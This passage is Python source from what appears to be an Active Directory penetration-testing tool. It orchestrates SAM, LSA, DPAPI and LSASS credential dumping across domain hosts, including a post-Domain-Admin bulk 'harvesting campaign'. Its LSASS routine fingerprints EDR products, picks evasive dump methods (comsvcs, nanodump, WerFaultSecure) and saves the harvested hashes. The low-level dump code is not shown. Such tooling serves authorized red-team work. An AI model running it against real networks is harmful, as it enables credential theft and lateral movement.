        f"  [{_AMBER}]Proceed with SAM bulk dump across {marked_domain}?[/{_AMBER}]",
        default=False,
    ):
        run_dump_sam(
            shell,
            domain=domain,
            username=username,
            password=password,
            host="All",
            islocal="false",
        )
    else:
        _CONSOLE.print(
            f"  [{_MUTED}]SAM bulk dump aborted at the OPSEC gate.[/{_MUTED}]"
        )


def run_ask_for_dump_all_dpapi(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Prompt user to dump DPAPI credentials from all hosts in domain.

    Renders the OPSEC disclosure panel first so the operator sees the
    telemetry footprint before the confirmation prompt.
    """
    marked_domain = mark_sensitive(domain, "domain")
    _render_opsec_panel(
        "dpapi",
        target_label=f"All hosts in [bold]{marked_domain}[/bold]",
    )
    if Confirm.ask(
        f"  [{_AMBER}]Proceed with DPAPI bulk dump across {marked_domain}?[/{_AMBER}]",
        default=False,
    ):
        run_dump_dpapi(
            shell,
            domain=domain,
            username=username,
            password=password,
            host="All",
            islocal="false",
        )
    else:
        _CONSOLE.print(
            f"  [{_MUTED}]DPAPI bulk dump aborted at the OPSEC gate.[/{_MUTED}]"
        )


def run_ask_for_post_da_host_dumps(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Offer a guided post-DA host dump campaign (SAM/LSA/DPAPI)."""
    marked_domain = mark_sensitive(domain, "domain")
    marked_username = mark_sensitive(username, "user")
    message = "\n".join(
        [
            "[bold]Host Credential Harvesting Campaign[/bold]",
            f"Domain: {marked_domain}",
            f"Identity: {marked_username}",
            "",
            "After Domain Admin access, this campaign helps uncover lateral movement paths that",
            "are usually missed in a first pass.",
            "",
            "[bold]Why it is high-value[/bold]",
            "- SAM dumps reveal local account hashes that may be reused across hosts.",
            "- LSA dumps reveal cached credentials and service secrets for pivoting.",
            "- DPAPI dumps reveal stored secrets that can unlock additional access.",
            "",
            "You can review and approve each dump type individually in the next prompts.",
        ]
    )
    print_panel(
        message,
        title="[bold cyan]Post-Compromise Discovery[/bold cyan]",
        border_style="cyan",
        expand=False,
    )

    if not Confirm.ask(
        "Start the host dump campaign now?",
        default=False
    ):
        print_info("Skipping host dump campaign.")
        return

    run_ask_for_dump_all_sam(
        shell,
        domain=domain,
        username=username,
        password=password,
    )
    run_ask_for_dump_all_lsa(
        shell,
        domain=domain,
        username=username,
        password=password,
    )
    run_ask_for_dump_all_dpapi(
        shell,
        domain=domain,
        username=username,
        password=password,
    )


def run_do_dump_lsa(shell: Any, args: str) -> None:
    """
    Dumps the LSA credentials from specified hosts within a domain.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        args: A string containing space-separated arguments:
            - domain (str): The domain name.
            - username (str): The username for authentication.
            - password (str): The password for the specified username.
            - host (str): The target host or 'All' for all hosts in the domain.
            - islocal (str): Indicates if the operation is local ('true') or remote ('false').

    The function dumps LSA credentials using the native async SMB path.
    Bulk targets are executed by the native async batch orchestrator.
    """
    args_list = args.split()
    if len(args_list) != 5:
        print_warning("Usage: dump_lsa <domain> <username> <password> <host> <islocal>")
        return
    domain = args_list[0]
    username = args_list[1]
    password = args_list[2]
    host = args_list[3]
    islocal = args_list[4]
    run_dump_lsa(
        shell,
        domain=domain,
        username=username,
        password=password,
        host=host,
        islocal=islocal,
    )


def run_do_dump_lsass(shell: Any, args: str) -> None:
    """
    Dumps LSASS credentials from specified hosts within a domain.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        args: A string containing space-separated arguments:
            - domain (str): The domain name.
            - username (str): The username for authentication.
            - password (str): The password for the specified username.
            - host (str): The target host or 'All' for all hosts in the domain.
            - islocal (str): Indicates if the operation is local ('true') or remote ('false').

    The function dumps LSASS via the native async SMB stack (PPL-aware backend
    selection: WerFaultSecure / SilentProcessExit / comsvcs / nanodump). Bulk
    targets are executed by the native async batch orchestrator.

    Usage:
        dump_lsass <domain> <username> <password> <host> <islocal>
    """
    args_list = args.split()
    if len(args_list) != 5:
        print_warning(
            "Usage: dump_lsass <domain> <username> <password> <host> <islocal>"
        )
        return
    domain = args_list[0]
    username = args_list[1]
    password = args_list[2]
    host = args_list[3]
    islocal = args_list[4]
    run_dump_lsass(
        shell,
        domain=domain,
        host=host,
        username=username,
        password=password,
        islocal=islocal,
    )


def run_do_dump_sam(shell: Any, args: str) -> None:
    """
    Parses the given arguments and initiates the SAM credential dumping process.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        args: A string containing space-separated arguments:
            - domain (str): The domain name.
            - username (str): The username for authentication.
            - password (str): The password for the specified username.
            - host (str): The target host or 'All' for all hosts in the domain.
            - islocal (str): Indicates if the operation is local ('true') or remote ('false').

    Usage:
        dump_sam <domain> <username> <password> <host> <islocal>
    """
    args_list = args.split()
    if len(args_list) != 5:
        print_warning("Usage: dump_sam <domain> <username> <password> <host> <islocal>")
        return
    domain = args_list[0]
    username = args_list[1]
    password = args_list[2]
    host = args_list[3]
    islocal = args_list[4]
    run_dump_sam(
        shell,
        domain=domain,
        username=username,
        password=password,
        host=host,
        islocal=islocal,
    )


def run_do_dump_dpapi(shell: Any, args: str) -> None:
    """
    Parses the given arguments and initiates the DPAPI credential dumping process.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        args: A string containing space-separated arguments:
            - domain (str): The domain name.
            - username (str): The username for authentication.
            - password (str): The password for the specified username.
            - host (str): The target host or 'All' for all hosts in the domain.
            - islocal (str): Indicates if the operation is local ('true') or remote ('false').

    Usage:
        dump_dpapi <domain> <username> <password> <host> <islocal>
    """
    args_list = args.split()
    if len(args_list) != 5:
        print_warning(
            "Usage: dump_dpapi <domain> <username> <password> <host> <islocal>"
        )
        return
    domain = args_list[0]
    username = args_list[1]
    password = args_list[2]
    host = args_list[3]
    islocal = args_list[4]
    run_dump_dpapi(
        shell,
        domain=domain,
        username=username,
        password=password,
        host=host,
        islocal=islocal,
    )


def run_ask_for_dump_lsass(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
    host: str,
    islocal: str,
) -> None:
    """Prompt user to dump LSASS credentials from host.

    LSASS is the loudest Windows telemetry surface in the dump catalog
    (Sysmon 10, MDI/MDE \"suspicious LSASS access\", 4663 on lsass.exe).
    We render a full OPSEC disclosure panel first, then gate on an explicit
    host-name confirmation per tui-design Dialogs / severe-action policy.
    """
    marked_host = mark_sensitive(host, "hostname")
    _render_opsec_panel("lsass", target_label=str(marked_host))
    if _confirm_severe_lsass(str(marked_host), host):
        workspace_dir = _native_workspace_dir(shell, domain)
        with _temporary_dump_creds(
            shell, domain=domain, username=username, secret=password, islocal=islocal
        ):
            _run_native_async(
                run_intelligent_lsass_dump(
                    shell, host=host, domain=domain, workspace_dir=workspace_dir
                )
            )
    else:
        _CONSOLE.print(
            f"  [{_MUTED}]LSASS dump aborted at the OPSEC gate.[/{_MUTED}]"
        )


async def run_intelligent_lsass_dump(
    shell: Any,
    host: str,
    domain: str,
    workspace_dir: str,
    preferred_method: str | None = None,
    skip_fingerprint: bool = False,
) -> bool:
    """Intelligent LSASS dump: fingerprint → select method → dump → catch detection.

    Always fingerprints first (unless skip_fingerprint=True) so the operator sees
    host security posture and method rationale before any dump attempt starts.
    Returns True on success.
    """
    config = _build_smb_config_from_shell(shell, host, domain)
    intel = EdrIntelligence(workspace_dir)

    # Global EDR intelligence warnings from prior catches on other hosts
    prior_warnings: list[str] = []
    for method in _ALL_METHODS:
        prior_warnings.extend(intel.global_warnings_for_method(method.name))
    _render_global_edr_warnings(prior_warnings)

    _CONSOLE.print(
        f"\n[bold {_ICE}]◉  LSASS Dump[/bold {_ICE}]  [{_MUTED}]{host}[/{_MUTED}]\n"
    )

    # ── Phase 1: Fingerprint ──────────────────────────────────────────────────
    fp: HostFingerprint | None = None
    if not skip_fingerprint:
        with Progress(
            SpinnerColumn(style=_ICE),
            TextColumn(f"[{_MUTED}]Fingerprinting {host}...[/{_MUTED}]"),
            transient=True,
            console=_CONSOLE,
        ) as prog:
            prog.add_task("")
            fp = await HostFingerprintService().fingerprint(config)

        if fp.detected_products:
            intel.record_host_products(
                config.target_ip,
                [(p.name, p.category) for p in fp.detected_products],
            )
        if fp.error:
            print_info_verbose(f"[lsass] fingerprint partial error: {fp.error}")

        ranked = LsassMethodSelector.rank(fp, intel)
        _render_fingerprint_panel(fp, ranked)

        # Pre-dump confirmation: operator confirms method (or picks a different one).
        chosen = _prompt_method_confirm(ranked)
        if chosen is None:
            return False
        preferred_method = chosen.name if chosen != ranked[0] else preferred_method

    # ── Phase 2: Dump (with live method-attempt feedback) ─────────────────────
    attempt: list[int] = [0]

    def _progress(step: str, detail: str) -> None:
        if step == "dump":
            attempt[0] += 1
            label = (
                f"[{_ICE}]⚡[/{_ICE}]" if attempt[0] == 1 else f"[{_AMBER}]↻[/{_AMBER}]"
            )
            _CONSOLE.print(f"  {label}  [{_MUTED}]{detail}[/{_MUTED}]")
        elif step == "catch":
            _CONSOLE.print(f"  [{_LAVA}]🚨  {detail}[/{_LAVA}]")

    _ranked_for_gate = ranked if fp is not None else []
    orchestrator = LsassDumpOrchestrator(scratch_dir="/tmp", progress_cb=_progress)
    result = await orchestrator.run(
        config=config,
        workspace_dir=workspace_dir,
        intel=intel,
        preferred_method=preferred_method,
        fp_override=fp,
        method_failed_cb=_make_method_failed_gate(_ranked_for_gate)
        if _ranked_for_gate
        else None,
    )

    if result.catch_detected and result.catch_product:
        _render_catch_alert(result.method_used, result.catch_product)

    # ── Phase 3: Results ──────────────────────────────────────────────────────
    if result.success and result.dump_result:
        creds = result.dump_result.credentials
        _CONSOLE.print()

        display = DumpDisplay(console=_CONSOLE)

        # Phase 1: display only (Live active, no console prints allowed).
        display.start_credential_stream(
            f"LSASS  ·  {result.method_used}  ·  {len(creds)} creds"
        )
        for cred in creds:
            account = (
                f"{cred.domain}\\{cred.username}" if cred.domain else cred.username
            )
            secret = cred.nt_hash or cred.lm_hash or cred.sha1 or ""
            display.stream_credential(CredentialType.LSASS, account, secret)
        display.stop_credential_stream()

        # Phase 2: persist (Live stopped, verification + TGT panels render cleanly).
        saved = 0
        for cred in creds:
            secret = cred.nt_hash or cred.lm_hash or cred.sha1 or ""
            if cred.username and secret:
                try:
                    shell.add_credential(domain or cred.domain, cred.username, secret,
                                         credential_origin="lsass_dump")
                    saved += 1
                except Exception as exc:
                    telemetry.capture_exception(exc)

        # Register uploaded artifacts in the ledger and report cleanup status.
        dr = result.dump_result
        if dr.artifacts_cleaned or dr.artifacts_failed:
            ledger = getattr(shell, "environment_change_ledger", None)
            for path in (*dr.artifacts_cleaned, *dr.artifacts_failed):
                change_id: str | None = None
                if ledger is not None:
                    change_id = ledger.register_change(
                        kind="file_uploaded",
                        domain=domain or "",
                        target=path,
                        detail={"host": host, "method": result.method_used},
                        method=result.method_used,
                    )
                if path in dr.artifacts_cleaned:
                    if ledger is not None and change_id:
                        ledger.mark_reverted(change_id)
                else:
                    if ledger is not None and change_id:
                        ledger.mark_failed(
                            change_id,
                            error=f"Delete failed; manual cleanup required on {host}",
                            manual_cleanup_instructions=f'del "{path}" on {host}',
                        )

            total = len(dr.artifacts_cleaned) + len(dr.artifacts_failed)
            if dr.artifacts_failed:
                _CONSOLE.print(
                    f"  [{_LAVA}]✗[/{_LAVA}]  [{_MUTED}]Cleanup partial:  "
                    f"{len(dr.artifacts_cleaned)}/{total} artifacts removed  "
                    f"·  {len(dr.artifacts_failed)} left on target[/{_MUTED}]"
                )
            else:
                _CONSOLE.print(
                    f"  [{_ACID}]✓[/{_ACID}]  [{_MUTED}]Artifacts cleaned  "
                    f"({total}/{total})[/{_MUTED}]"
                )

        footer = RichText()
        footer.append("  method  ", style=_MUTED)
        footer.append(result.method_used, style=f"bold {_ACID}")
        footer.append("    saved  ", style=_MUTED)
        footer.append(str(saved), style=f"bold {_ACID}")
        if result.dump_result.dump_local_path:
            footer.append("    dump  ", style=_MUTED)
            footer.append(result.dump_result.dump_local_path, style=_MUTED)
        _CONSOLE.print(footer)
        _CONSOLE.print()
        return True

    _CONSOLE.print(
        Panel(
            (
                f"[bold {_LAVA}]No credentials recovered.[/bold {_LAVA}]\n"
                f"[{_MUTED}]  Reason   [/{_MUTED}] "
                f"[{_LAVA}]{result.error or 'All methods exhausted: no successful dump'}[/{_LAVA}]\n"
                f"[{_MUTED}]  Next     [/{_MUTED}] "
                f"[{_MUTED}]Try a different host, or run sam / lsa dumps which leave a smaller surface than LSASS.[/{_MUTED}]"
            ),
            title=f"[bold {_LAVA}]✗  LSASS Dump Failed[/bold {_LAVA}]",
            border_style=_LAVA,
            padding=(0, 1),
        )
    )
    return False
